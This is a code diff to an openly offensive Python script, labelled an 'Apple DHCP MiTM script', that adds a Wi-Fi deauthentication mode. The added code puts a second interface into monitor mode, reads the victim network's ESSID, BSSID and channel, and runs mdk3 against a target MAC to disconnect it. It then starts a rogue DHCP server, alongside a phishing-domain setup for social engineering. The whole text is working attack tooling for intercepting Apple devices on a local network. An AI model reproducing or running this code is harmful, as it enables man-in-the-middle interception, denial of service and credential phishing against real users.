@@ -29,8 +29,9 @@ Base.print_banner()
 
 # region Parse script arguments
 parser = ArgumentParser(description='Apple DHCP MiTM script')
-parser.add_argument('-i', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
-parser.add_argument('-d', '--phishing_domain', type=str, default="auth.apple.wi-fi.com",
+parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
+parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
+parser.add_argument('-D', '--phishing_domain', type=str, default="auth.apple.wi-fi.com",
                     help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
 parser.add_argument('-p', '--phishing_domain_path', type=str, default="apple",
                     help='Set local path to domain name for social engineering (default="apple")')
@@ -38,6 +39,7 @@ parser.add_argument('-k', '--kill', action='store_true', help='Kill all subproce
 parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
 parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
 parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')
+parser.add_argument('--deauth', action='store_true', help='Use wifi deauth technique for disconnect Apple device')
 args = parser.parse_args()
 # endregion
 
@@ -60,19 +62,25 @@ sub.Popen(["kill -9 $(lsof -iTCP -n -P | grep ':443' | awk '{print $2}') 2>/dev/
 # endregion
 
 # region Set global variables
+listen_network_interface = None
+deauth_network_interface = None
+
 apple_devices = []
 apple_device = []
 localnet_ip_addresses = []
 ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
 target_ip = None
 new_ip = None
+
+bssid = None
+essid = None
+channel = None
+freq = None
 # endregion
 
 # region Get listen network interface, your IP address, first and last IP in local network
-listen_network_interface = None
-
 if args.listen_iface is None:
-    Base.print_warning("Set listen network interface:")
+    Base.print_warning("Set network interface for listen ARP and DHCP requests:")
     listen_network_interface = Base.netiface_selection()
 else:
     listen_network_interface = args.listen_iface
@@ -86,11 +94,63 @@ first_ip = Base.get_netiface_first_ip(listen_network_interface)
 last_ip = Base.get_netiface_last_ip(listen_network_interface)
 # endregion
 
+# region Get network interface for send wifi deauth packets, get wifi settings from listen network interface
+
+if args.deauth:
+    # region Get network interface for send wifi deauth packets
+    if args.deauth_iface is None:
+        Base.print_warning("Set network interface for send wifi deauth packets:")
+        deauth_network_interface = Base.netiface_selection()
+    else:
+        deauth_network_interface = args.deauth_iface
+
+    if listen_network_interface == deauth_network_interface:
+        Base.print_error("Network interface for listening DHCP requests (", listen_network_interface,
+                         ") and network interface for send WiFi deauth packets must be differ!")
+        exit(1)
+    # endregion
+
+    # region Get wifi settings from listen network interface
+    try:
+        iwgetid = sub.Popen(['iwgetid -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
+        essid, essid_err = iwgetid.communicate()
+        iwgetid = sub.Popen(['iwgetid -a -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
+        bssid, bssid_err = iwgetid.communicate()
+        iwgetid = sub.Popen(['iwgetid -c -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
+        channel, channel_err = iwgetid.communicate()
+        iwgetid = sub.Popen(['iwgetid -f -r ' + listen_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
+        freq, freq_err = iwgetid.communicate()
+
+        essid = essid.rstrip()
+        bssid = bssid.rstrip()
+        channel = channel.rstrip()
+        freq = freq.rstrip()
+
+        if essid is None or essid == "":
+            Base.print_error("Network interface: ", listen_network_interface, " is not connected to WiFi AP!")
+            exit(1)
+    except OSError as e:
+        if e.errno == errno.ENOENT:
+            Base.print_error("Program: iwgetid is not installed!")
+            exit(1)
+        else:
+            Base.print_error("Something else went wrong while trying to run `iwgetid`")
+            exit(2)
+    # endregion
+
+# endregion
+
 # region General output
 Base.print_info("Listen network interface: ", listen_network_interface)
 Base.print_info("Your IP address: ", your_ip_address)
 Base.print_info("First ip address: ", first_ip)
 Base.print_info("Last ip address: ", last_ip)
+
+if args.deauth:
+    Base.print_info("Interface ", listen_network_interface, " connect to: ", essid + " (" + bssid + ")")
+    Base.print_info("Interface ", listen_network_interface, " channel: ", channel)
+    Base.print_info("Interface ", listen_network_interface, " frequency: ", freq)
+    Base.print_info("Deauth network interface: ", deauth_network_interface)
 # endregion
 
 # region Check target IP and new IP addresses
@@ -119,7 +179,31 @@ if args.new_ip is not None:
         exit(1)
 # endregion
 
+# region Main function
 if __name__ == "__main__":
+
+    # region Set monitor mode on network interface for send wifi deauth packets
+    if args.deauth:
+        Base.print_info("Set Monitor mode on interface: ", deauth_network_interface, " ...")
+        try:
+            sub.Popen(['ifconfig ' + deauth_network_interface + ' down'], shell=True, stdout=sub.PIPE)
+            sub.Popen(['iwconfig ' + deauth_network_interface + ' mode monitor'], shell=True, stdout=sub.PIPE)
+            wireless_settings = sub.Popen(['iwconfig ' + deauth_network_interface], shell=True, stdout=sub.PIPE)
+            wireless_settings_out, wireless_settings_error = wireless_settings.communicate()
+
+            if wireless_settings_out.find("Mode:Monitor") == -1:
+                Base.print_error("Could not set Monitor mode on interface: ", deauth_network_interface)
+                exit(1)
+
+            sub.Popen(['ifconfig ' + deauth_network_interface + ' up'], shell=True, stdout=sub.PIPE)
+        except OSError as e:
+            if e.errno == errno.ENOENT:
+                Base.print_error("Program: iwconfig or ifconfig is not installed!")
+                exit(1)
+            else:
+                Base.print_error("Something else went wrong while trying to run `iwconfig` or `ifconfig`")
+                exit(2)
+    # endregion
 
     # region Social engineering
 
@@ -299,17 +383,23 @@ if __name__ == "__main__":
             apple_device = [target_ip, target_mac]
     # endregion
 
+    # region If apple devices are found
+
     if len(apple_device) > 0:
         # region Output target IP and MAC address
-        Base.print_info("Target: ", apple_device[0] + " (" + apple_device[1] + ")")
+        target_ip_address = apple_device[0]
+        target_mac_address = apple_device[1]
+        Base.print_info("Target: ", target_ip_address + " (" + target_mac_address + ")")
         # endregion
 
         # region Set new IP address for target
         if args.new_ip is None:
+
             # region Fast scan localnet with arp-scan
             Base.print_info("Search for free IP addresses on the local network ...")
             localnet_ip_addresses = Scanner.find_ip_in_local_network(listen_network_interface)
             # endregion
+
             index = 0
             while new_ip is None:
                 check_ip = str(IPv4Address(unicode(first_ip)) + index)
@@ -318,38 +408,78 @@ if __name__ == "__main__":
                 else:
                     index += 1
             index = 0
+
         Base.print_info("Target new ip: ", new_ip)
         # endregion
 
         # region Run apple_rogue_dhcp and network_conflict_creator scripts
-        try:
-            sub.Popen(['python ' + script_dir + '/Scripts/Apple/apple_rogue_dhcp.py -i ' + listen_network_interface +
-                       ' -t ' + apple_device[1] + ' -I ' + new_ip + ' -q &'],
-                      shell=True)
-            sleep(3)
-            sub.Popen(['python ' + script_dir + '/Scripts/Others/network_conflict_creator.py -i ' +
-                       listen_network_interface + ' -I ' + apple_device[0] + ' -t ' + apple_device[1] +
-                       ' -q'], shell=True)
-        except OSError as e:
-            if e.errno == errno.ENOENT:
-                Base.print_error("Program: ", "python", " is not installed!")
-                exit(1)
-            else:
-                Base.print_error("Something else went wrong while trying to run ",
-                                 "`apple_rogue_dhcp.py`", " or ", "`network_conflict_creator.py`")
-                exit(2)
+        if not args.deauth:
+            try:
+                sub.Popen(['python ' + script_dir + '/Scripts/Apple/apple_rogue_dhcp.py -i ' +
+                           listen_network_interface + ' -t ' + target_mac_address +
+                           ' -I ' + new_ip + ' -q &'],
+                          shell=True)
+                sleep(3)
+                sub.Popen(['python ' + script_dir + '/Scripts/Others/network_conflict_creator.py -i ' +
+                           listen_network_interface + ' -I ' + target_ip_address +
+                           ' -t ' + target_mac_address + ' -q'], shell=True)
+            except OSError as e:
+                if e.errno == errno.ENOENT:
+                    Base.print_error("Program: ", "python", " is not installed!")
+                    exit(1)
+                else:
+                    Base.print_error("Something else went wrong while trying to run ",
+                                     "`apple_rogue_dhcp.py`", " or ", "`network_conflict_creator.py`")
+                    exit(2)
         # endregion
 
-        # region Check apple_rogue_dhcp script is run
+        # region Run dhcp_rogue_server script and mdk3 for send deauth packets to Target
+        if args.deauth:
+            try:
+                sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcp_rogue_server.py -i ' +
+                           listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
+                           ' --dnsop --exit --quiet &'],
+                          shell=True)
+                sleep(3)
+
+                # Write target MAC address to blacklist file for mdk3
+                blacklist_file_name = "/tmp/blacklist.txt"
+                with open(blacklist_file_name, 'w') as blacklist_file:
+                    blacklist_file.write(target_mac_address + '\n')
+
+                # Start mdk3 process with timeout 5 sec.
+                sub.Popen(['timeout 10 mdk3 ' + deauth_network_interface + ' -c ' + channel +
+                           ' -b ' + blacklist_file_name + ' >/dev/null 2>&1'], shell=True)
+            except OSError as e:
+                if e.errno == errno.ENOENT:
+                    Base.print_error("Program: ", "python", " or ", "mdk3", " is not installed!")
+                    exit(1)
+                else:
+                    Base.print_error("Something else went wrong while trying to run ",
+                                     "`dhcp_rogue_server.py`", " or ", "`mdk3`")
+                    exit(2)
+        # endregion
+
+        # region Check apple_rogue_dhcp or dhcp_rogue_server script is run
         try:
+            if args.deauth:
+                script_name = "dhcp_rogue_server"
+            else:
+                script_name = "apple_rogue_dhcp"
+
             rogue_server_is_run = True
             start = time()
+
             while rogue_server_is_run:
+
+                # Check timeout
                 if (int(time() - start) > 120):
-                    sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep |" +
+                    sub.Popen(["kill -9 $(ps aux | grep \"" + script_name + "\" | grep -v grep |" +
                                " awk '{print $2}') 2>/dev/null"], shell=True)
-                ps = sub.Popen(['ps aux | grep "apple_rogue_dhcp" | grep -v grep'],
+
+                ps = sub.Popen(['ps aux | grep "' + script_name + '" | grep -v grep'],
                                shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
+
                 ps_out, ps_err = ps.communicate()
                 if ps_out == "":
                     rogue_server_is_run = False
@@ -365,3 +495,7 @@ if __name__ == "__main__":
                 Base.print_error("Something else went wrong while trying to run ", "`ps`")
                 exit(2)
         # endregion
+
+    # endregion
+
+# endregion
